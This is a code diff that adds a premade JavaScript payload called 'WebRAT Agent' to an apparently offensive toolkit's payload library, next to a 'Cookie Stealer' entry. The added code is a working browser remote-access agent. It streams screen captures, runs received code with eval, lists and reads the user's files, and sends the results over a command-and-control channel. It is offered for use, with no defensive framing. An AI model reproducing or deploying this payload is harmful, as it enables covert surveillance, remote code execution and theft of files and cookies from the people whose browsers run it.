@@ -3,6 +3,109 @@ import type { JsPayload } from '@/components/javascript-library';
 
 export const PREMADE_PAYLOADS: JsPayload[] = [
     {
+        name: "WebRAT Agent",
+        description: "Full-featured agent for the Remote Access Toolkit page. Enables screen sharing, remote shell, and file system access.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    let screenStream = null;
+    let snapshotInterval = null;
+
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+    
+    // --- WebRAT C2 Functions ---
+    async function handleScreenStart() {
+        try {
+            if (screenStream && screenStream.active) {
+                screenStream.getTracks().forEach(track => track.stop());
+            }
+            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const videoTrack = screenStream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+
+            snapshotInterval = setInterval(async () => {
+                if(screenStream.active) {
+                    const blob = await imageCapture.takePhoto();
+                    const reader = new FileReader();
+                    reader.onloadend = () => exfiltrate('webrat-c2', { sub_type: 'screen-chunk', data: { chunk: reader.result }});
+                    reader.readAsDataURL(blob);
+                } else {
+                    handleScreenStop();
+                }
+            }, 500); // Send frame every 500ms
+
+            videoTrack.onended = () => handleScreenStop();
+        } catch (e) {
+            exfiltrate('webrat-c2', { sub_type: 'screen-stop', data: { error: e.message } });
+        }
+    }
+
+    function handleScreenStop() {
+        if (snapshotInterval) clearInterval(snapshotInterval);
+        if (screenStream) screenStream.getTracks().forEach(track => track.stop());
+        snapshotInterval = null;
+        screenStream = null;
+        exfiltrate('webrat-c2', { sub_type: 'screen-stop', data: {} });
+    }
+
+    function handleShellExec(code) {
+        try {
+            const output = eval(code);
+            exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: String(output) }});
+        } catch (e) {
+            exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: 'Error: ' + e.message }});
+        }
+    }
+    
+    async function handleFsList() {
+        try {
+            const dirHandle = await window.showDirectoryPicker();
+            const files = [];
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    files.push({ name: file.name, size: file.size, type: file.type });
+                }
+            }
+            exfiltrate('webrat-c2', { sub_type: 'fs-listing', data: { files } });
+        } catch (e) {
+             exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: 'Error listing files: ' + e.message }});
+        }
+    }
+
+    async function handleFsRead(fileName) {
+        try {
+            const dirHandle = await window.showDirectoryPicker();
+            const fileHandle = await dirHandle.getFileHandle(fileName);
+            const file = await fileHandle.getFile();
+            const content = await file.arrayBuffer();
+            exfiltrate('webrat-c2', { sub_type: 'file-content', data: { name: file.name, content }});
+        } catch(e) {
+             exfiltrate('webrat-c2', { sub_type: 'shell-output', data: { output: 'Error reading file: ' + e.message }});
+        }
+    }
+
+    channel.addEventListener('message', async (event) => {
+        if (event.data.type !== 'webrat-command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
+        
+        const { command, data } = event.data;
+        switch(command) {
+            case 'screen-start': await handleScreenStart(); break;
+            case 'screen-stop': handleScreenStop(); break;
+            case 'shell-exec': handleShellExec(data.code); break;
+            case 'fs-list': await handleFsList(); break;
+            case 'fs-read': await handleFsRead(data.name); break;
+        }
+    });
+
+    exfiltrate('connection', { message: 'WebRAT Agent loaded.' });
+})();
+`.trim(),
+    },
+    {
         name: "Cookie Stealer",
         description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
         code: `
